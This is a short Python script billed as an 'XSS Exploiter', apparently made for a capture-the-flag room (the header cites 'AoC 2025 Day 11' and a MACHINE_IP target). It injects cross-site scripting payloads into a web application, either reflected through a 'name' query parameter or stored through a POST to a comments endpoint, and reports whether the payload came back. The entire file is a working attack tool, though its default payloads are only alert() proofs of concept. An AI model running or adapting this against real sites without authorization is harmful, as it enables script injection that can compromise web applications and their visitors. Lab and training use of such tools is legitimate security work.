import requests
import argparse

# Exceptional XSS Exploiter - AoC 2025 Day 11 Inspired
# Usage: python xss_exploit.py --url http://MACHINE_IP/greet --payload "<script>alert(1)</script>"

parser = argparse.ArgumentParser(description="XSS Exploiter")
parser.add_argument("--url", required=True, help="Target URL")
parser.add_argument("--payload", default="<script>alert('XSS')</script>", help="XSS payload")
parser.add_argument("--type", default="reflected", choices=["reflected", "stored"], help="XSS type")
args = parser.parse_args()

if args.type == "reflected":
    exploit_url = f"{args.url}?name={args.payload}"
    print(f"[*] Exploiting reflected: {exploit_url}")
    resp = requests.get(exploit_url)
    if "alert" in resp.text:
        print("[+] Payload injected!")
elif args.type == "stored":
    data = {"comment": args.payload}
    resp = requests.post(f"{args.url}/comments", data=data)
    print("[+] Stored payload sent. Check page for execution.")
